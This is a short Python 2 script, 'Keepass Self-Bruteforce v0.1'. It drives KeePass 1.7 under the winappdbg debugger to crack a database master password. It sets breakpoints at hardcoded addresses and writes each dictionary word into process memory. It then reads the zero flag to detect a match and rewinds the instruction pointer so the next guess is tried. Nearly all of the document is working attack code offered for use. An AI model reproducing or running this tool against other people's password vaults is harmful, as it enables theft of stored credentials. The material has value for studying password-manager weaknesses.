# Keepass Self-Bruteforce v0.1
# Based in Keepass version 1.7
# Programmed by Miguel Febres
# mafebresv at q-protex.com
# http://www.q-protex.com

# Performance: 50~60 words per second (Core Duo 2.2GHZ)

from winappdbg import Debug
from time import strftime
import time

counter=0
word=""
words=[]
r_eax=0
r_ecx=0
r_edx=0

WORD_SIZE = 20

#Save the state of the registers
def action_0( event ):
    global r_eax, r_ecx, r_rdx
    aThread = event.get_thread()
    r_eax = aThread.get_register("Eax")
    r_ecx = aThread.get_register("Ecx")
    r_edx = aThread.get_register("Edx")


#Write the word
def action_1( event ):
    global word
    global words
    global counter
    global WORD_SIZE

    aThread = event.get_thread()
    aProcess = event.get_process()
    memDir = aThread.get_register("Ecx")
    word=words[counter]
    word = word.replace("\n","")
    word = word[0:WORD_SIZE-1]
    #word = word.lower() #optional
    aProcess.poke(memDir,word + "\0")


#Check the flag state        
def action_2( event ):
    global word
    global counter
    aThread = event.get_thread()
    b = aThread.get_flag_value(aThread.Flags.Zero)
    if b:
        print 'Counter: ' + repr(counter) + ' - Correct: ' + word
        event.get_process().kill()
    else:
        #if (counter%10000)==0:
        print 'Counter: ' + repr(counter) + ' - Incorrect: ' + word

        #increment the counter
        if counter< len(words)-1:
            counter+=1
            aThread.set_register("Eip", 0x004D6699)
        else:
            event.get_process().kill()


#Restore the registers to the original state
def action_3( event ):
    aThread = event.get_thread()
    aThread.set_register("Eax",r_eax)
    aThread.set_register("Ecx",r_ecx)
    aThread.set_register("Edx",r_edx)
    aThread.set_register("Eip", 0x004DC395)

    
#Specify a dictionary here
words = open('dic.txt', "r").readlines()
print "[+] Words Loaded: ",len(words)


try:
    debug = Debug()

    #Start a new process for debugging
    #Allocate 20 bytes for the words
    aProcess = debug.execv( ['KeePass.exe', 'test.kdb','-pw:'.ljust(WORD_SIZE+4)])

    #Set the breakpoints
    debug.break_at(aProcess.get_pid() , 0x004DC395, action_0)
    debug.break_at(aProcess.get_pid() , 0x004D77A0, action_1)
    debug.break_at(aProcess.get_pid() , 0x004D6684, action_2)
    debug.break_at(aProcess.get_pid() , 0x004DC39A, action_3)

    #Wait for the debugee to finish
    t1 = time.clock() 
    debug.loop()

finally:
    debug.stop()

print 'Finished in ' + repr(time.clock() - t1) + ' seconds!'

